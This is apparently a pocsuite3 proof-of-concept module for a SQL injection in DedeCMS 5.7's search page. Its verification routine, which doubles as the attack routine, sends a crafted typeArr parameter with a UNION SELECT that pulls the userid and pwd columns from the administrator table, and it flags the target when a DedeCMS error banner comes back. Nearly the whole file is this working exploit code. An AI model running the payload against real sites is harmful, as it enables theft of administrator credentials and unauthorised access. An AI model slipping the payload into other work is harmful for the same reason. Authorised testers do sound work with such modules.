#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url

class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = '''DedeCMS_search_sqli'''
	desc = ''''''
	solution = ''''''
	severity = '''high'''
	vulType = '''sql-inj'''
	taskType = '''app-vul'''
	references = ['''''']
	appName = '''dedecms'''
	appVersion = '''5.7'''
	appPowerLink = ''''''
	samples = ['''''']
	install_requires = ['''''']

	def _verify(self):
		result = {}
		self.url, ip, port = parse_ip_port(self.target, 80)
		verify_url = make_verify_url(self.url, "/plus/search.php?keyword=as&typeArr[111%3D@%60\%27%60)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%60%23@__admin%60%23@%60\%27%60+]=a", mod=0)
		response = requests.get(verify_url, verify=False, timeout=15)
		if b'DedeCMS Error Warning!' in response.content:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = response.url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	_attack = _verify

	def parse_output(self, result):
		# parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Internet nothing returned')
		return output


register_poc(TestPOC)